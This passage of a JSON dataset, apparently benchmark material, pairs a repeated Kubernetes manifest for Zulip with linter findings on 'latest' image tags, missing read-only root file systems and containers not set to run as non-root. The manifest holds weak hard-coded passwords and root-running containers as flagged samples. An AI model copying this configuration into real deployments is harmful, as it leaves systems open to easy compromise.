    "violation_text": "The container \"postgresql\" is using an invalid container image, \"quay.io/galexrt/zulip-postgresql-tsearchextras:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03918",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"quay.io/sameersbn/redis:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03919",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"memcached\" does not have a read-only root file system"
  },
  {
    "id": "03920",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgresql\" does not have a read-only root file system"
  },
  {
    "id": "03921",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rabbitmq\" does not have a read-only root file system"
  },
  {
    "id": "03922",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "03923",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zulip\" does not have a read-only root file system"
  },
  {
    "id": "03924",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"memcached\" is not set to runAsNonRoot"
  },
  {
    "id": "03925",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgresql\" is not set to runAsNonRoot"
  },
  {
    "id": "03926",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rabbitmq\" is not set to runAsNonRoot"
  },
  {
    "id": "03927",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
